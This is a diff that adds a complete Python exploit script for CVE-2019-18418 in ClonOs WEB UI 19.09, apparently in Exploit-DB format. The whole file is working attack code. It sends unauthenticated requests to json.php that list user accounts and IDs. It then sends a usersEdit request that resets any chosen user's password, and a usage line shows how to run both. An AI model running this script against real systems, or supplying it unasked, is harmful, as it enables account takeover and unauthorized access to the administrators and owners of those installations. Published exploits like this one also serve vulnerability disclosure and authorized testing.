@@ -1,0 +1,44 @@
+# Exploit Title: ClonOs WEB UI 19.09 - Improper Access Control
+# Date: 2019-10-19
+# Exploit Author: İbrahim Hakan Şeker
+# Vendor Homepage: https://clonos.tekroutine.com/
+# Software Link: https://github.com/clonos/control-pane
+# Version: 19.09
+# Tested on: ClonOs
+# CVE : 2019-18418
+
+
+import requests
+from bs4 import BeautifulSoup
+import sys
+
+def getUser(host):
+    reg=r'\"'
+    r1 = requests.post(host+"/json.php",data={"mode":"getJsonPage","path":"/users/","hash":"","db_path":""},headers={"X-Requested-With":"XMLHttpRequest"})
+    r1_source = BeautifulSoup(r1.content,"lxml")
+    for k in r1_source.findAll("tr"):
+        for i in k.findAll("td")[0]:
+            print(f"[+]User Found: {i}  User id: {k.get('id').replace(reg,'')}")
+def changePassword(host,user,password,id):
+    data={
+        "mode":"usersEdit",
+        "path":"/users/",
+        "hash":"",
+        "db_path":"",
+        "form_data[username]":f"{user}",
+        "form_data[password]":f"{password}",
+        "form_data[password1]":f"{password}",
+        "form_data[first_name]":"",
+        "form_data[last_name]":"",
+        "form_data[actuser]":"on",
+        "form_data[user_id]": int(id)
+        }
+    r2=requests.post(host,data=data,headers={"X-Requested-With":"XMLHttpRequest"})
+    if r2.status_code==200:print("[+]OK")
+    else:print("[-]Fail")
+if __name__=="__main__":
+    if len(sys.argv)>1:
+        if "getUser" in sys.argv[1]:getUser(sys.argv[2])
+        elif "changePassword" in sys.argv[1]:changePassword(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])
+        else:print("Fail parameter")
+    else:print("Usage: exploit.py getUser [http://ip_adres]\nexploit.py changePassword [http://ip_adres] [username] [new_password] [user_id]")
